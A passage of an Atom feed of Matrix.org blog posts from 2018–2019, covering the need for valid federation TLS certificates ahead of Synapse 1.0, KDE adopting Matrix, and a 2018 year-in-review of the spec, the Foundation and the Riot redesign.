 	&lt;li style=&quot;font-weight: 400;&quot;&gt;If they are not valid check out the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;MSC1711_certificates_FAQ.md&quot;&gt;FAQ&lt;&#x2F;a&gt;.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Follow along with progress at &lt;a href=&quot;https:&#x2F;&#x2F;arewereadyyet.com&quot;&gt;https:&#x2F;&#x2F;arewereadyyet.com&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Tell all your admin friends.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Folks, as you know we are now very close to achieving Matrix 1.0 and finally being in a position to shed our ‘beta&#x27; tag. It has been a long time coming and speaks to the huge effort from hundreds of people over the past 5 years.
&lt;p&gt;A critical step towards this goal is the release of Synapse 1.0. We want to ship Synapse 1.0 as soon as possible but can&#x27;t do so without your help! &lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d like to introduce &lt;a href=&quot;http:&#x2F;&#x2F;arewereadyyet.com&#x2F;&quot;&gt; AreWeReadyYet.com&lt;&#x2F;a&gt; - a quick and easy way for everyone to track the progress and check if their federation is ready for Matrix 1.0!!&lt;&#x2F;p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.arewereadyyet.com&#x2F;&quot;&gt;&lt;img class=&quot;alignnone wp-image-4110 size-medium&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;03&#x2F;Screenshot-2019-03-15-at-10.05.19-300x214.png&quot; alt=&quot;Are we ready yet?&quot; width=&quot;300&quot; height=&quot;214&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
Synapse 1.0 is good news for anyone running a Synapse installation - it contains critical bug fixes, security patches, a new room algorithm version and dramatically improved user and room search. However, as part of the security work it also 
&lt;b&gt;contains a breaking change from previous Synapse versions. From 1.0 onwards it will necessary to ensure a valid TLS certificate on the federation API. Self signed certificates will no longer be accepted&lt;&#x2F;b&gt;. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;MSC1711_certificates_FAQ.md#it-used-to-work-just-fine-why-are-you-breaking-everything&quot;&gt;Why would we do such a thing?&lt;&#x2F;a&gt;
&lt;p&gt;In anticipation for this, everyone currently running a homeserver must ensure that they have checked their federation certificate (check yours &lt;a href=&quot;&#x2F;federationtester&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;). Failure to do so will mean being unable to federate with any Matrix 1.0 compliant server. If your server fails the check, our &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;MSC1711_certificates_FAQ.md&quot;&gt;FAQ&lt;&#x2F;a&gt; has all the details on what you need to do. &lt;&#x2F;p&gt;
&lt;p&gt;This post is a call to arms to try and get as many admins to upgrade their certificates as possible. We are tracking adoption at &lt;a href=&quot;https:&#x2F;&#x2F;arewereadyyet.com&quot;&gt;https:&#x2F;&#x2F;arewereadyyet.com&lt;&#x2F;a&gt; - currently this sits at about 55% - we need this figure to be higher before we can pull the lever.  &lt;&#x2F;p&gt;
&lt;p&gt;So what are you waiting for? Check that your server has valid certs - then tell all your admin pals to do the same. 
&lt;b&gt;Friends don&#x27;t let friends miss out on Synapse 1.0, send them to&lt;&#x2F;b&gt;&lt;a href=&quot;http:&#x2F;&#x2F;arewereadyyet.com&#x2F;&quot;&gt;&lt;b&gt; arewereadyyet.com&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&lt;b&gt; (or tweet &lt;&#x2F;b&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;intent&#x2F;tweet?text=Are%20you%20running%20a%20Matrix%20server%3F%20Are%20you%20ready%20for%20Matrix%201.0%3F%20Find%20out%20at%20https%3A%2F%2Farewereadyyet.com!&quot;&gt;&lt;b&gt;here&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&lt;b&gt; to remind them!)&lt;&#x2F;b&gt; We really need the community to help us here because at some point soon, we will need to pull the lever and release.&lt;&#x2F;p&gt;
&lt;p&gt;Once we make more progress on adoption, we will announce an official release date and finally get Synapse out of beta!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Welcome to Matrix, KDE!</title>
        <published>2019-02-20T00:00:00+00:00</published>
        <updated>2019-02-20T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/02/20/welcome-to-matrix-kde/" type="text/html"/>
        <id>https://matrix.org/blog/2019/02/20/welcome-to-matrix-kde/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;re very excited to officially welcome the KDE Community on to Matrix as they announce that &lt;a href=&quot;https:&#x2F;&#x2F;dot.kde.org&#x2F;2019&#x2F;02&#x2F;20&#x2F;kde-adding-matrix-its-im-framework&quot;&gt;KDE Community is officially adopting Matrix&lt;&#x2F;a&gt; as a chat platform, and kde.org now has an official Matrix homeserver!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;dot.kde.org&#x2F;2019&#x2F;02&#x2F;20&#x2F;kde-adding-matrix-its-im-framework&quot;&gt;&lt;img class=&quot;aligncenter wp-image-4015&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;02&#x2F;kde-matrix-1-1024x355.png&quot; alt=&quot;&quot; width=&quot;653&quot; height=&quot;226&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You can see the full announcement and explanation over at &lt;a href=&quot;https:&#x2F;&#x2F;dot.kde.org&#x2F;2019&#x2F;02&#x2F;20&#x2F;kde-adding-matrix-its-im-framework&quot;&gt;https:&#x2F;&#x2F;dot.kde.org&#x2F;2019&#x2F;02&#x2F;20&#x2F;kde-adding-matrix-its-im-framework&lt;&#x2F;a&gt;.  It is fantastic to see one of the largest Free Software communities out there proactively adopting Matrix as an open protocol, open network and FOSS project, rather than drifting into a proprietary centralised chat system.  It&#x27;s also really fun to see Riot 1.0 finally holding its own as a chat app against the proprietary alternatives!&lt;&#x2F;p&gt;
&lt;p&gt;This doesn&#x27;t change the KDE rooms which exist in Matrix today or indeed the KDE Freenode IRC channels - so many of the KDE community were already using Matrix, all the rooms already exist and are already bridged to the right places.  All it means is that there&#x27;s now a shiny new homeserver (powered by &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt;) on which KDE folk are welcome to grab an account if they want, rather than sharing the rather overloaded public matrix.org homeserver.  The rooms have been set up on the server to match their equivalent IRC channels - for instance, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#kde:kde.org&quot;&gt;#kde:kde.org&lt;&#x2F;a&gt; is the same as #kde on Freenode; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#kde-devel:kde.org&quot;&gt;#kde-devel:kde.org&lt;&#x2F;a&gt; is the same as #kde-devel etc.  The rooms continue to retain their other aliases (&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#kde:matrix.org&quot;&gt;#kde:matrix.org&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#freenode_#kde:matrix.org&quot;&gt;#freenode_#kde:matrix.org&lt;&#x2F;a&gt; etc) as before.&lt;&#x2F;p&gt;
&lt;p&gt;There&#x27;s also a dedicated Riot&#x2F;Web install up at &lt;a href=&quot;https:&#x2F;&#x2F;webchat.kde.org&quot;&gt;https:&#x2F;&#x2F;webchat.kde.org&lt;&#x2F;a&gt;, and instructions on connecting via other Matrix clients up at &lt;a href=&quot;https:&#x2F;&#x2F;community.kde.org&#x2F;Matrix&quot;&gt;https:&#x2F;&#x2F;community.kde.org&#x2F;Matrix&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;02&#x2F;Screenshot-2019-02-20-at-01.56.40.png&quot;&gt;&lt;img class=&quot;aligncenter wp-image-4020&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2019&#x2F;02&#x2F;Screenshot-2019-02-20-at-01.56.40-1024x898.png&quot; alt=&quot;&quot; width=&quot;832&quot; height=&quot;730&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is great news for the Matrix ecosystem in general - and should be particularly welcome for Qt client projects like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;QMatrixClient&#x2F;Quaternion&quot;&gt;Quaternion&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;spectral-im&#x2F;spectral&quot;&gt;Spectral&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Nheko-Reborn&#x2F;nheko&quot;&gt;Nheko-Reborn&lt;&#x2F;a&gt;, who may feel a certain affinity to KDE!&lt;&#x2F;p&gt;
&lt;p&gt;So: welcome, KDE!  Hope you have a great time, and please let us know how you get on, so we can make sure Matrix kicks ass for you :)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;the Matrix Core Team&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The 2018 Matrix Holiday Special!</title>
        <published>2018-12-25T00:00:00+00:00</published>
        <updated>2018-12-25T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/12/25/the-2018-matrix-holiday-special/" type="text/html"/>
        <id>https://matrix.org/blog/2018/12/25/the-2018-matrix-holiday-special/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s that time again where we break out the mince pies and brandy butter (at least for those of us in the UK) and look back on the year to see how far Matrix has come, as well as anticipate what 2019 may bring!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;&#x2F;h3&gt;
&lt;p&gt;It&#x27;s fair to say that 2018 has been a pretty crazy year.  We have had one overriding goal: to take the &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;01&#x2F;29&#x2F;status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem&#x2F;&quot;&gt;funding&lt;&#x2F;a&gt; we received in January, stabilise and freeze the protocol and get it and the reference implementations out of beta and to a 1.0 - to provide a genuinely open and decentralised mainstream alternative to the likes of Slack, Discord, WhatsApp etc.  What&#x27;s so crazy about that, you might ask?&lt;&#x2F;p&gt;
&lt;p&gt;Well, in parallel with this we&#x27;ve also seen adoption of Matrix accelerating ahead of our dev plan at an unprecedented speed: with France selecting Matrix to power the communication infrastructure of its whole public sector - first &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;04&#x2F;26&#x2F;matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app&#x2F;&quot;&gt;trialling over the summer&lt;&#x2F;a&gt;, and now &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1070392608801910784&quot;&gt;confirmed for full roll-out&lt;&#x2F;a&gt; as of a few weeks ago.  Meanwhile there are several other similar-sized projects on the horizon which we can&#x27;t talk about yet.  We&#x27;ve had the growing pains of establishing &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;New Vector&lt;&#x2F;a&gt; as a startup in order to hire the core team and support these projects.  We&#x27;ve launched &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular&lt;&#x2F;a&gt; to provide professional-quality SaaS Matrix hosting for the wider community and help fund the team.  And most importantly, we&#x27;ve also been establishing the non-profit &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;10&#x2F;29&#x2F;introducing-the-matrix-org-foundation-part-1-of-2&#x2F;&quot;&gt;Matrix.org Foundation&lt;&#x2F;a&gt; to formalise the open governance of the Matrix protocol and protect and isolate it from any of the for-profit work.&lt;&#x2F;p&gt;
&lt;p&gt;However: things have just about come together.  Almost all the spec work for 1.0 is done and we are now aiming to get a 1.0 released in time by the end of January (in time for FOSDEM).  Meanwhile Synapse has improved massively in terms of performance and stability (not least having migrated over to &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;12&#x2F;21&#x2F;porting-synapse-to-python-3&#x2F;&quot;&gt;Python 3&lt;&#x2F;a&gt;); Riot&#x27;s spectacular redesign is now &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;redesign-experimenters-needed-afa7c2d4c858&quot;&gt;available for testing&lt;&#x2F;a&gt; right now; E2E encryption is more stable than ever with the usability rework &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;compare&#x2F;develop...uhoreg:e2e_cross-signing&quot;&gt;landing&lt;&#x2F;a&gt; as we speak.  And we&#x27;ve even got a full rewrite of Riot&#x2F;Android in the wings.&lt;&#x2F;p&gt;
&lt;p&gt;But it&#x27;s certainly been an interesting ride.  Longer-term spec work has been delayed by needing to apply band-aids to mitigate abuse of the outstanding issues.  Riot redesign was pushed back considerably due to prioritising Riot performance over UX. The E2E UX work has forced us to consider E2E holistically… which does not always interact well with structuring the dev work into bite-sized chunks.  Dendrite has generally been idling whilst we instead pour most of our effort into getting to 1.0 on Synapse (rather than diluting 1.0 work across both projects). These tradeoffs have been hard to make, but hopefully we have chosen the correct path in the end.&lt;&#x2F;p&gt;
&lt;p&gt;Overall, as we approach 1.0, the project is looking better than ever - hopefully everyone has seen both Riot and Synapse using less RAM and being more responsive and stable, E2E being more reliable, and anyone who has played with the &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&#x2F;experimental&quot;&gt;Riot redesign&lt;&#x2F;a&gt; beta should agree that it is light-years ahead of yesterday&#x27;s Riot and something which can genuinely surpass today&#x27;s centralised proprietary incumbents. And that is unbelievably exciting :D&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d like to thank everyone for continuing to support Matrix - especially our &lt;a href=&quot;http:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; &amp;amp; &lt;a href=&quot;http:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt; supporters, whose donations continue to be critical for helping fund the core dev team, and also those who are supporting the project indirectly by hosting homeservers with &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular&lt;&#x2F;a&gt;.  We are going to do everything humanly possible to ship 1.0 over the coming weeks, and then the sky will be the limit!&lt;&#x2F;p&gt;
&lt;p&gt;Before going into what else 2019 will hold, however, let&#x27;s take the opportunity to give a bit more detail on the various core team projects which landed in 2018…&lt;&#x2F;p&gt;
&lt;h2 id=&quot;france&quot;&gt;France&lt;&#x2F;h2&gt;
&lt;p&gt;DINSIC (France&#x27;s Ministry of Digital, IT &amp;amp; Comms) have been busy building out their massive cross-government Matrix deployment and custom Matrix client throughout most of the year.  After the &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;04&#x2F;26&#x2F;matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app&#x2F;&quot;&gt;announcement in April&lt;&#x2F;a&gt;, this started off with an initial deployment over the summer, and is now moving towards the full production rollout, as confirmed at the Paris Open Source Summit a few weeks ago by Mounir Mahjoubi, the Secretary of State of Digital.  All the press coverage about this ended up in French, with the biggest writeup being at &lt;a href=&quot;https:&#x2F;&#x2F;www.cio-online.com&#x2F;actualites&#x2F;lire-mounir-mahjoubi%C2%A0-%C2%A0le-libre-n-est-pas-toujours-moins-cher-mais-c-est-toujours-plus-transparent%C2%A0-10842.html&quot;&gt;CIO Online&lt;&#x2F;a&gt;, but the main mention of Matrix (badly translated from French) is:&lt;&#x2F;p&gt;
&lt;p style=&quot;padding-left: 30px;&quot;&gt;&lt;i&gt;Denouncing the use of tools such as WhatsApp; a practice that has become commonplace within ministerial offices, Mounir Mahjoubi announced the launch in production of Tchap, based on Matrix and Riot: an instant messaging tool that will be provided throughout the administrations. So, certainly, developing a product can have a certain cost. Integrating it too. &quot;Free is not always cheaper but it&#x27;s always more transparent,&quot; admitted the Secretary of State.
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
The project really shows off Matrix at its best, with up to 60 different deployments spread over different ministries and departments; multiple clusters per Ministry; end-to-end encryption enabled by default (complete with e2e-aware antivirus scanning); multiple networks for different classes of traffic; and the hope of federating with the public Matrix network once the S2S API is finalised and suitable border gateways are available.  It&#x27;s not really our project to talk about, but we&#x27;ll try to share as much info as we can as roll-out continues.
&lt;h2 id=&quot;the-matrix-specification&quot;&gt;The Matrix Specification&lt;&#x2F;h2&gt;
&lt;p&gt;A major theme throughout the year has been polishing the &lt;a href=&quot;&#x2F;docs&#x2F;spec&quot;&gt;Matrix Spec&lt;&#x2F;a&gt; itself for its first full stable release, having had more than enough time to see which bits work in practice now and which bits need rethinking.  This all kicked off with the &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;05&#x2F;17&#x2F;introducing-matrix-specification-changes&#x2F;&quot;&gt;creation of the Matrix Spec Change process&lt;&#x2F;a&gt; back in May, which provides a formal process for reviewing and accepting contributions from anyone into the spec.  Getting the balance right between agility and robustness has been quite tough here, especially pre-1.0 where we&#x27;ve needed to move rapidly to resolve the remaining long-lived sticking points.  However, a process like this risks encouraging the classic “&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Perfect_is_the_enemy_of_good&quot;&gt;Perfect is the Enemy of Good&lt;&#x2F;a&gt;” problem, as all and sundry jump in to apply their particular brand of perfectionism to the spec (and&#x2F;or the process around it) and risk smothering it to death with enthusiasm.  So we&#x27;ve ended up iterating a few times on the process and hopefully now converged on an approach which will work for 1.0 and beyond. If you haven&#x27;t checked out the current &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;proposals&quot;&gt;proposals guide&lt;&#x2F;a&gt; please give it a look, and feel free to marvel at all the MSCs in flight.  You can also see a &lt;a href=&quot;&#x2F;~richardv&#x2F;proposal_news.html&quot;&gt;quick and dirty timeline of all the MSC status changes&lt;&#x2F;a&gt; since we introduced the process, to get an idea of how it&#x27;s all been progressing.&lt;&#x2F;p&gt;
&lt;p&gt;In August we had a big sprint to cut &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;09&#x2F;03&#x2F;matrix-spec-update-august-2018&#x2F;&quot;&gt;stable “r0” releases of all the APIs&lt;&#x2F;a&gt; of the spec which had not yet reached a stable release (i.e. all apart from the Client-Server API, which has been stable since Dec 2015 - hence in part the large number of usable independent Matrix clients relative to the other bits of the ecosystem).  In practice, we managed to release 3 out of the 4 remaining APIs - but needed more time to solve the remaining blocking issues with the Server-Server API. So since August (modulo operational and project distractions) we&#x27;ve been plugging away on the S2S API.  &lt;&#x2F;p&gt;
&lt;p&gt;The main blocking issue for a stable S2S API has been State Resolution. This is the fundamental algorithm used to determine the state of a given room whenever a race or partition happens between the servers participating in it.  For instance: if Alice kicks Bob on her server at the same time as Charlie ops Bob on his server, who should win? It&#x27;s vital that all servers reach the same conclusion as to the state of the room, and we don&#x27;t want servers to have to replicate a full copy of the room&#x27;s history (which could be massive) to reach a consistent conclusion.  Matrix&#x27;s original state resolution algorithm dates back to the initial usable S2S implementation at the beginning of 2015 - but over time deficiencies in the algorithm became increasingly apparent. The most obvious issue is the “&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;2432&quot;&gt;Hotel California&lt;&#x2F;a&gt;” bug, where users can be spontaneously re-joined to a room they&#x27;ve previously left if the room&#x27;s current state is merged with an older copy of the room on another server and the ‘wrong&#x27; version wins the conflict - a so-called state-reset.&lt;&#x2F;p&gt;
&lt;p&gt;After a lot of thought we ended up proposing an &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;erikj&#x2F;state_res_rejections&#x2F;proposals&#x2F;1442-state-resolution.md&quot;&gt;all new State Resolution algorithm&lt;&#x2F;a&gt; in July 2018, nicknamed State Resolution Reloaded.  This extends the original algorithm to consider the ‘auth chain&#x27; of state events when performing state resolution (i.e. the sequence of events that a given state event cites as evidence of its validity) - as well as addressing a bunch of other issues.  For those wishing to understand in more detail, there&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;erikj&#x2F;state_res_rejections&#x2F;proposals&#x2F;1442-state-resolution.md&quot;&gt;the MSC&lt;&#x2F;a&gt; itself, the formal terse description of the algorithm now merged into the &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;server_server&#x2F;unstable.html#state-resolution-algorithm-for-version-2-rooms&quot;&gt;unstable S2S spec&lt;&#x2F;a&gt; - or alternatively there&#x27;s an excellent &lt;a href=&quot;https:&#x2F;&#x2F;matrix.uhoreg.ca&#x2F;stateres&#x2F;reloaded.html&quot;&gt;step-by-step explanation and guided example&lt;&#x2F;a&gt; from uhoreg (warning: contains Haskell :)  Or you can watch Erik and Matthew try to explain it all on &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;f6ZdmPSUUBA&quot;&gt;Matrix Live&lt;&#x2F;a&gt; back in July.&lt;&#x2F;p&gt;
&lt;p&gt;Since the initial proposal in July, the algorithm has been proofed out in a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-test-state-resolution-ideas&quot;&gt;test jig&lt;&#x2F;a&gt;, iterated on some more to better specify &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1693&quot;&gt;how to handle rejected events&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;4040&quot;&gt;implemented in Synapse&lt;&#x2F;a&gt;, and is now ready to roll.  The only catch is that to upgrade to it we&#x27;ve had to introduce the concept of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1516&#x2F;files&quot;&gt;room versioning&lt;&#x2F;a&gt;, and to flush out historical issues we require you to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;rav&#x2F;room_upgrades&#x2F;proposals&#x2F;1501-room-version-upgrades.md&quot;&gt;re-create rooms to upgrade them&lt;&#x2F;a&gt; to the new resolution algorithm. Getting the logistics in place for this is a massive pain, but we&#x27;ve got an approach now which should be sufficient. Clients will be free to smooth over the transition in the UI as gracefully as possible (and in fact Riot has this already hooked up).  So: watch this space as v2 rooms with all-new state resolution in the coming weeks!&lt;&#x2F;p&gt;
&lt;p&gt;Otherwise, there are a bunch of other issues in the S2S API which we are still working through (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;erikj&#x2F;event_id_hashes&#x2F;proposals&#x2F;1640-event-id-as-hashes.md&quot;&gt;changing event IDs to be hashes&lt;&#x2F;a&gt; of event contents to avoid lying about IDs, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1711&quot;&gt;switching to use normal X.509 certificates for federation&lt;&#x2F;a&gt; and so resolve problems with Perspectives, etc).  &lt;&#x2F;p&gt;
&lt;p&gt;Once these land and are implemented in Synapse over the coming weeks, we will be able to finally declare a 1.0!&lt;&#x2F;p&gt;
&lt;p&gt;Also on the spec side of things, it&#x27;s worth noting that a lot of effort went into improving performance for clients in the form of the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1227&quot;&gt;Lazy Loading Members MSC&lt;&#x2F;a&gt;.  This ended up consuming a lot of time over the summer as we updated Synapse and the various matrix-*-sdks (and thus Riot) to only calculate and send details to the clients about members who are currently talking in a room, whereas previously we sent the entire state of the room to the client (even including users who had left). The end result however is a 3-5x reduction in RAM on Riot, and a 3-5x speedup on initial sync.  The current MSC is currently being &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1758&quot;&gt;merged as we speak&lt;&#x2F;a&gt; into the main spec (thanks Kitsune!) for inclusion in upcoming CS API 0.5.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-matrix-org-foundation-cic&quot;&gt;The Matrix.org Foundation (CIC!)&lt;&#x2F;h2&gt;
&lt;p&gt;Alongside getting the open spec process up and running, we&#x27;ve been establishing The Matrix.org Foundation as an independent non-profit legal entity responsible for neutrally safeguarding the Matrix spec and evolution of the protocol.  This kicked off in June with the “&lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;06&#x2F;20&#x2F;towards-open-governance-for-matrix-org&#x2F;&quot;&gt;Towards Open Governance&lt;&#x2F;a&gt;” blog post, and continued with the &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;10&#x2F;29&#x2F;introducing-the-matrix-org-foundation-part-1-of-2&#x2F;&quot;&gt;formal incorporation&lt;&#x2F;a&gt; of The Matrix.org Foundation in October.  Since then, we&#x27;ve spent a lot of time with the non-profit lawyers evolving &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1318&quot;&gt;MSC1318&lt;&#x2F;a&gt; into the final Articles of Association (and other guidelines) for the Foundation.  This work is basically solved now; it just needs MSC1318 to be updated with the conclusions (which we&#x27;re running late on, but is top of Matthew&#x27;s MSC todo list).&lt;&#x2F;p&gt;
&lt;p&gt;In other news, we have confirmation that the &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Community_interest_company&quot;&gt;Community Interest Company&lt;&#x2F;a&gt; (CIC) status for The Matrix.org Foundation has been approved - this means that the CIC Regulator has independently reviewed the initial Articles of Association and approved that they indeed lock the mission of the Foundation to be non-profit and to act solely for the good of the wider online community.  In practice, this means that the Foundation will be formally renamed The Matrix.org Foundation C.I.C, and provides a useful independent safeguard to ensure the Foundation remains on track.&lt;&#x2F;p&gt;
&lt;p&gt;The remaining work on the Foundation is:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Update and land MSC1318, particularly on clarifying the relationship between the legal Guardians (Directors) of the Foundation and the technical members of the core spec team, and how funds of the Foundation will be handled.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Update the Articles of Association of the Foundation based on the end result of MSC1318
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Transfer any Matrix.org assets over from New Vector to the Foundation.  Given Matrix&#x27;s code is all open source, there isn&#x27;t much in the way of assets - we&#x27;re basically talking about the matrix.org domain and website itself.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Introduce the final Guardians for the Foundation.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
We&#x27;ll keep you posted with progress as this lands over the coming months.
&lt;h2 id=&quot;riot&quot;&gt;Riot&lt;&#x2F;h2&gt;
&lt;p&gt;2018 has been a bit of a chrysalis year for Riot: the vast majority of work has been going into the &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;a-sneak-peek-at-a-whole-new-riot-im-1114df653782&quot;&gt;massive redesign&lt;&#x2F;a&gt; we started in May to improve usability &amp;amp; cosmetics, performance, stability, and E2E encryption usability improvements.  We&#x27;ve consciously spent most of the year feature frozen in order to polish what we already have, as we&#x27;ve certainly been guilty in the past of landing way too many features without necessarily applying the needed amount of UX polish.&lt;&#x2F;p&gt;
&lt;p&gt;However, as of today, we&#x27;re super-excited to announce that Riot&#x27;s redesign is at the point where the intrepid can start experimenting with it - in fact, internally most of the team has switched over to dogfooding (testing) the redesign as of a week or so ago.  Just shut down your current copy of Riot&#x2F;Web or Desktop and go to &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&#x2F;experimental&quot;&gt;https:&#x2F;&#x2F;riot.im&#x2F;experimental&lt;&#x2F;a&gt; instead if you want to experiment (we don&#x27;t recommend running both at the same time).  Please note that it is still work-in-progress and there&#x27;s a lot of polish still to land and some cosmetic bugs still hanging around, but it&#x27;s definitely at the point of feeling better than the old app.  Most importantly, please provide feedback (by hitting the lifesaver-ring button at the bottom left) to let us know how you get on. See the &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;redesign-experimenters-needed-afa7c2d4c858&quot;&gt;Riot blog&lt;&#x2F;a&gt; for more details!&lt;&#x2F;p&gt;
